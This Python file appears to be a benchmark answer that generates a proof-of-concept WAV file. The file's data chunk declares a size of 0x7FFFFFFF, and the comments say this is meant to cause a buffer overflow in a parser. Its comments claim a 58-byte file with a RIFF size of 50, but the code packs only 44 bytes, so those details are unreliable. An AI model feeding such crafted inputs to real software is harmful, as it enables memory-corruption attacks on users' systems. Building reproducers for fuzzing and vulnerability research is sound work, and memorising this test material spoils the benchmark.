import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF WAV file structure with malformed chunk sizes
        # Ground-truth length: 58 bytes
        
        # RIFF header
        riff_chunk = b'RIFF'
        file_size = 50  # Total file size - 8 = 58 - 8 = 50
        wave_format = b'WAVE'
        
        # fmt subchunk
        fmt_chunk = b'fmt '
        fmt_size = 16  # PCM format size
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 44100
        byte_rate = 44100 * 1 * 2
        block_align = 2
        bits_per_sample = 16
        
        # data subchunk - malformed size that extends beyond file end
        data_chunk = b'data'
        # Malicious size: 0x7FFFFFFF (max positive 32-bit int)
        # This will cause buffer overflow when reading
        data_size = 0x7FFFFFFF
        
        # Pack everything
        data = riff_chunk
        data += struct.pack('<I', file_size)
        data += wave_format
        data += fmt_chunk
        data += struct.pack('<I', fmt_size)
        data += struct.pack('<H', audio_format)
        data += struct.pack('<H', num_channels)
        data += struct.pack('<I', sample_rate)
        data += struct.pack('<I', byte_rate)
        data += struct.pack('<H', block_align)
        data += struct.pack('<H', bits_per_sample)
        data += data_chunk
        data += struct.pack('<I', data_size)
        
        return data
